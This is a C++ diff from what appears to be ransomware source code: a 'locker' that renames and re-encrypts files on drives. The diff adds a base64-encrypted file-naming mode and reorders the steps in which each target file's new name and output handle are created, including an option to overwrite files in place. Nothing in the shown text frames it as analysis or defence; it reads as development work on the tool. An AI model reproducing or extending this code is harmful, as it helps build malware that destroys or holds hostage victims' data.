@@ -410,6 +410,7 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 
 	switch (GLOBAL_ENUM.g_CryptName)
 	{
+	case NAME::BASE64_NAME_CRYPT:
 	case NAME::BASE64_NAME:
 		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameBase;
 		break;
@@ -469,9 +470,6 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		.filesize = 0,
 		.padding = 0
 	};
-
-	if((FileInfo->recent_filename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
-	 	return false;
 	
 	if (CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
 	{
@@ -490,21 +488,22 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; %s", data->Filename);
 		return false;
 	}
-	
-	if(GLOBAL_STATE.g_write_in)
-	{
-		FileInfo->recent_filehandle = FileInfo->filehandle;
-	}
-	else if (!api::create_file_open(&FileInfo->recent_filehandle, FileInfo->recent_filename) 
-			|| FileInfo->recent_filehandle == INVALID_HANDLE_VALUE)
-	{
-		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; %s", data->Filename);
-		return false;
-	}
 
 	if (!(FileInfo->hblock = filesystem::init_mdata_hblock(FileInfo))->status)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [INIT_MEATA_HBLOCK] Failed; %s", data->Filename);
+		return false;
+	}
+	
+	if((FileInfo->recent_filename = filesystem::NameMethodState(FileInfo, data)) == NULL)
+	 	return false;
+
+	if(GLOBAL_STATE.g_write_in)
+		FileInfo->recent_filehandle = FileInfo->filehandle;
+	else if (!api::create_file_open(&FileInfo->recent_filehandle, FileInfo->recent_filename) 
+			|| FileInfo->recent_filehandle == INVALID_HANDLE_VALUE)
+	{
+		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; %s", data->Filename);
 		return false;
 	}
 
